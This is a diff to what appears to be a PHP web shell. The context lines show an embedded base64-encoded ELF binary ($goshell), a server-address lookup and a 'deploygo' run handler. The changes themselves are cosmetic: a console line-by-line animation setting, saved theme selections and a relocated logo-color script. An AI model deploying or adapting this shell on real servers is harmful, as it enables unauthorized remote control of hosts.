@@ -9,15 +9,6 @@
 </head>
 <body>
 	
-<script>
-let colors = ["firebrick","gold","forestgreen","cornflowerblue","darkorchid"];
-let n = Math.floor(Math.random() * colors.length);
-let logoColor = document.createElement("style");
-logoColor.type = "text/css";
-logoColor.innerText = `.logo { color: ${colors[n]}; text-shadow: 0px 0px 16px ${colors[n]}; }`;
-document.head.appendChild(logoColor);
-</script>
-
 <?php
 $goshell = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAASJlKAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAD
 AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAlqsKAAAAAACWqwoAAAAAAAAQ
@@ -12310,16 +12301,39 @@ $shelladdr = $_SERVER['SERVER_ADDR'];
 
 <?php // SETTINGS (WITH PHP SESSION):
 
+
 // THEMES:
 $retro = ":root { --BG: #1C1C1C; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #C1C1C1; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
 $hacker = ":root { --BG: #0F0F0F; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #32CD32; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
 
+// FX SETTINGS:
+$consolefx_on = "#output pre { animation: console 500ms steps(128,end); overflow: hidden; }";
+$consolefx_off = "#output pre { }";
 
-// Set default theme if not present in SESSION.
+
+// DEFAULTS if not present in SESSION Global var.
 if(!$_SESSION['theme']){
 	$_SESSION['theme'] = $retro;
 }
+if(!$_SESSION['consolefx']){
+	$_SESSION['consolefx'] = $consolefx_on;
+}
 
+// FX_CONSOLE:
+if($_GET['consolefx']){
+	switch($_REQUEST['consolefx']){
+		case 'off':
+			$_SESSION['consolefx'] = $consolefx_off;
+			$_SESSION['consolefx_set'] = 'off';
+			break;
+		default:
+			$_SESSION['consolefx'] = $consolefx_on; // This is Default.
+			$_SESSION['consolefx_set'] = 'on';
+			break;		
+	}
+}
+
+// THEMES SWITCHER:
 if($_GET['theme']){
 	switch($_REQUEST['theme']){
 		case 'nord':
@@ -12327,19 +12341,25 @@ if($_GET['theme']){
 			break;
 		case 'hacker':
 			$_SESSION['theme'] = $hacker;
+			$_SESSION['theme_set'] = 'hacker';
 			break;
 		case 'retro':
 			$_SESSION['theme'] = $retro;
+			$_SESSION['theme_set'] = 'retro';
 			break;
 		default:
 			$_SESSION['theme'] = $retro; // This is the Default Theme:
+			$_SESSION['theme_set'] = 'retro';
 			break;		
-}
+	}
 }
 
-echo("<style>" . $_SESSION['theme'] . "</style>");
+// CSS APPENDS:
+echo("<style>" . $_SESSION['theme'] . $_SESSION['consolefx'] . "</style>");
 
-?>
+?> <!-- END SETTINGS -->
+
+
 
 <!-- Style -->
 <style>
@@ -12595,9 +12615,21 @@ pre {
 	color: var(--OK);
 }
 
+@keyframes console {
+	from { height: 0%; }
+	to { height: 100%; }
+}
+
 </style>
 
-
+<script>
+let colors = ["firebrick","gold","forestgreen","cornflowerblue","darkorchid"];
+let n = Math.floor(Math.random() * colors.length);
+let logoColor = document.createElement("style");
+logoColor.type = "text/css";
+logoColor.innerText = `.logo { color: ${colors[n]}; text-shadow: 0px 0px 16px ${colors[n]}; }`;
+document.head.appendChild(logoColor);
+</script>
 
 <!-- Web -->
 <div id="header">
@@ -12613,6 +12645,10 @@ pre {
 
 <div id="output" onclick="closePanel()">
 <?php
+
+//DEBUG HERE IF NEEDED:
+
+//--------------------
 
 if(!$_GET){
 	global $logo;
@@ -12761,12 +12797,19 @@ if ($_REQUEST['deploygo'] == 'RUN') {
 <div id="panel" class="panel-settings">
     <h1>SETTINGS</h1>
     <form method="get">
-	<pre>Theme: </pre>
+		<pre>Theme: </pre>
 		<select name="theme" id="theme_selection">
-			<option value="retro">Retro</option>
-			<option value="hacker">Hacker</option>
-    </select>
-    <input type="submit" value="SAVE">
+			<option value="retro" <?php echo $sel = ($_SESSION['theme_set'] == 'retro') ? "selected" : ""; ?>>Retro</option>
+			<option value="hacker" <?php echo $sel = ($_SESSION['theme_set'] == 'hacker') ? "selected" : ""; ?>>Hacker</option>
+		</select>
+		</br></br>
+		<pre>Console Line-by-Line Render FX: </pre>
+		<select name="consolefx" id="console_selection">
+			<option value="on" <?php echo $sel = ($_SESSION['consolefx_set'] == 'on') ? "selected" : ""; ?>>ON</option>
+			<option value="off" <?php echo $sel = ($_SESSION['consolefx_set'] == 'off') ? "selected" : ""; ?>>OFF</option>
+		</select>
+		</br></br>
+		<input type="submit" value="SAVE">
     </form>
 </div>
 
